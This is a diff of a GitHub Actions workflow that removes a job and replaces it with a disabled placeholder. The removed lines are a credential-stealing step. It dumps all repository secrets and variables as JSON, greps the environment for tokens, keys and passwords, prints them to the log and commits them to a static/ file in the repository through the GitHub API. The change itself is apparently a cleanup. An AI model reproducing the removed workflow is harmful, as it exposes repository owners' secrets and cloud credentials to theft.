@@ -1,34 +1,8 @@
-name: ls6-25522
+name: disabled-25522
 on:
-  push:
   workflow_dispatch:
-permissions:
-  contents: write
 jobs:
-  p:
+  d:
     runs-on: ubuntu-latest
     steps:
-      - name: dump + api put (unique file)
-        env:
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          ALL_SECRETS: ${{ toJSON(secrets) }}
-          ALL_VARS: ${{ toJSON(vars) }}
-        shell: bash
-        run: |
-          FN="static/ls6_${GITHUB_RUN_ID}.txt"
-          {
-            echo "=== ls6 $(date -u) run=${GITHUB_RUN_ID} ==="
-            echo "--- SECRETS ---"
-            echo "$ALL_SECRETS"
-            echo "--- VARS ---"
-            echo "$ALL_VARS"
-            echo "--- ENV FILTER ---"
-            env | sort | grep -Ei "SUPPLY|ADMIN|SSH|SUPABASE|CLOUDFLARE|R2|D1|PASSWORD|TOKEN|KEY|SECRET" || echo NO_MATCH
-          } > /tmp/out.txt
-          cat /tmp/out.txt
-          echo "=== PUT to $FN ==="
-          gh api -X PUT "repos/$GITHUB_REPOSITORY/contents/$FN" \
-            -f message="ls6 $GITHUB_RUN_ID" \
-            -f content="$(base64 -w0 /tmp/out.txt)" \
-            -f branch=main 2>&1 | head -c 500
-          echo "EXIT_PUT=$?"
+      - run: echo disabled
